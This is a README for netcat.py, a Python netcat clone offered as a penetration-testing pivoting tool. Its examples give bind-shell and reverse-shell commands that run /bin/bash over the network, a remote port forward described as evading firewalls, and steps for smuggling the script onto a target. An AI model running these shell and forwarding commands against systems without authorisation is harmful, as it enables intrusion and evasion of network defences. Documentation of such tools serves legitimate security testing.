# netcat.py

[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PyPI](https://img.shields.io/pypi/v/netcat)](https://pypi.org/project/netcat/)
[![PyPI - Status](https://img.shields.io/pypi/status/netcat)](https://pypi.org/project/netcat/)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/netcat)](https://pypi.org/project/netcat/)
[![PyPI - Format](https://img.shields.io/pypi/format/netcat)](https://pypi.org/project/netcat/)
[![PyPI - Implementation](https://img.shields.io/pypi/implementation/netcat)](https://pypi.org/project/netcat/)
[![PyPI - License](https://img.shields.io/pypi/l/netcat)](https://pypi.org/project/netcat/)

[![Build Status](https://github.com/cytopia/netcat/workflows/linting/badge.svg)](https://github.com/cytopia/netcat/actions?workflow=linting)
[![Build Status](https://github.com/cytopia/netcat/workflows/building/badge.svg)](https://github.com/cytopia/netcat/actions?workflow=building)
[![Build Status](https://github.com/cytopia/netcat/workflows/testing/badge.svg)](https://github.com/cytopia/netcat/actions?workflow=testing)


Dependency-less Python 2 and Python 3 compatible implementation of netcat which works on 32bit and 64bit systems to easily pivot your target.

**Motivation**

To have a single tool for older, newer, 32bit and 64bit machines with relevant options (`-e`. `-L` and `-R`) to create bind shells, local and remote port-forwards.


**Todo**

The options `e`, `-n`, `-L`, and `-R` are still under development. See [Usage](#computer-usage) for other available options.


## :tada: Install
```bash
pip install netcat
```


## :coffee: TL;DR

#### Copy to target
```bash
# Copy base64 data to clipboard from where you have internet access
curl https://raw.githubusercontent.com/cytopia/netcat/master/bin/netcat.py | base64

# Paste it on the target machine
echo "<BASE64 STRING>" | base64 -d > netcat.py
chmod +x netcat.py
```
#### Summon shells
```bash
# bind shell
netcat.py -l -e '/bin/bash' 8080
```
```bash
# reverse shell
netcat.py -e '/bin/bash' example.com 4444
```
#### Port-forwarding without SSH
```bash
# Make local port available to public interface locally
netcat.py -L 127.0.0.1:3306 192.168.0.1 3306
```
```bash
# Remote port-forwarding to evade firewalls
netcat.py -R 127.0.0.1:3306 example.com 4444
```


## :computer: Usage
```
usage: netcat.py [-Cnuv] [-e cmd] hostname port
       netcat.py [-Cnuv] [-e cmd] -l [hostname] port
       netcat.py [-Cnuv] -L addr:port [hostname] port
       netcat.py [-Cnuv] -R addr:port hostname port
       netcat.py -V, --version
       netcat.py -h, --help


Netcat implementation in Python with connect, listen and forward mode.

positional arguments:
  hostname              Address to listen, forward or connect to
  port                  Port to listen, forward or connect to

mode arguments:
  -l, --listen          Listen mode: Enable listen mode for inbound connects
  -L addr:port, --local addr:port
                        Local forward mode: Specify local <addr>:<port> to which traffic
                        should be forwarded to.
                        Netcat will listen locally (specified by hostname and port) and
                        forward all traffic to the specified value for -L/--local.
  -R addr:port, --remote addr:port
                        Remote forward mode: Specify local <addr>:<port> from which traffic
                        should be forwarded from.
                        Netcat will connect remotely (specified by hostname and port) and
                        for ward all traffic from the specified value for -R/--remote.

optional arguments:
  -e cmd, --exec cmd    Execute shell command. Only works with connect or listen mode.
  -C, --crlf            Send CRLF as line-endings (default: LF)
  -n, --nodns           Do not resolve DNS
  -u, --udp             UDP mode
  -v, --verbose         Be verbose and print info to stderr. Use -vv or -vvv for more verbosity.

misc arguments:
  -h, --help            Show this help message and exit
  -V, --version         Show version information and exit

examples:

  Create bind shell
    netcat.py -l -e '/bin/bash' 8080

  Create reverse shell
    netcat.py -e '/bin/bash' example.com 4444

  Local forward: Make localhost port available to another interface
    netcat.py -L 127.0.0.1:3306 192.168.0.1 3306

  Remote forward: Forward local port to remote server
    netcat.py -R 127.0.0.1:3306 example.com 4444
```


## :octocat: Contributing

See **[Contributing guidelines](CONTRIBUTING.md)** to help to improve this project.


## :lock: [cytopia](https://github.com/cytopia) sec tools

| Tool             | Category             | Language   | Description |
|------------------|----------------------|------------|-------------|
| [smtp-user-enum] | Enumeration          | Python 2+3 | SMTP users enumerator |
| [urlbuster]      | Enumeration          | Python 2+3 | Mutable web directory fuzzer |
| [netcat]         | Pivoting             | Python 2+3 | Cross-platform netcat |
| [badchars]       | Reverse Engineering  | Python 2+3 | Badchar generator |
| [fuzza]          | Reverse Engineering  | Python 2+3 | TCP fuzzing tool |

[netcat]: https://github.com/cytopia/netcat
[smtp-user-enum]: https://github.com/cytopia/smtp-user-enum
[urlbuster]: https://github.com/cytopia/urlbuster
[badchars]: https://github.com/cytopia/badchars
[fuzza]: https://github.com/cytopia/fuzza


## :exclamation: Disclaimer

This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.


## :page_facing_up: License

**[MIT License](LICENSE.txt)**

Copyright (c) 2020 **[cytopia](https://github.com/cytopia)**
